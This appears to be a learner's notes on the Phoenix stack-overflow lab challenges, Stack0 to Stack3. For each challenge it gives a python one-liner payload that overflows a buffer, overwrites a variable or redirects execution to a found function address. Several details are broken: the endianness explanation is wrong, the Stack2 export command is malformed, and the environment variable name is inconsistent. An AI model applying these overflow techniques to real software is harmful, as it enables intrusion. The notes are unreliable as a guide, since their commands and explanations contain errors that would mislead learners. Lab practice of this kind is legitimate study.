# Phoenix: is basic binar exploitation challenge:

# Note: challenges are located in /opt/phoenix/amd64


## Stack0:
- gets take un check data which could be used to create the buffer over flow:

```
python -c 'print("A"*70)' | ./stack_zero

```

## Stack1:

- The challenge is similar to the above challenge but one has to look for following things:
  1- read the little-Endians -> which store data from large to smaller values, so after the overflow provide the variables value in reverse order
  2- In the code the user provided input is taken as the argument in the for of ``` char ***argv ``` which is then copied to the buffer of length 64 buffer[64]:
  
  ```
   strcpy(locals.buffer, argv[1]);
  ```
  
  ==Note==: The file takes the input as the argument so we can not pass as the pipe it will give us the error instead we will do this:
  ```
  /stack-one $(python -c 'print("A" * 65 + "\x62\x59\x6c\x49")')
  
  ```
## Stack2:
- In this challenge code is using the envirnment variable with the name of ==ExploitateEducation== to be passed as the argument in the stack.
- so in order make the buffer overflow happen we will do :
```
export ExploitEducation = $(python -c 'print("A" * 65 + \x0a\x09\x0a\x0d)')

```
Simply run the function and we will have the over flow.

## stack3:

- In the stack three one has to first find the address of the complete_level function:
```
objdump -d ./stack-three | grep complete_level
000000000040069d <complete_level>:

```
```
0x40069d
python -c 'print "A" * 64 + "\x9d\x06\x40"' | ./stack-three
```
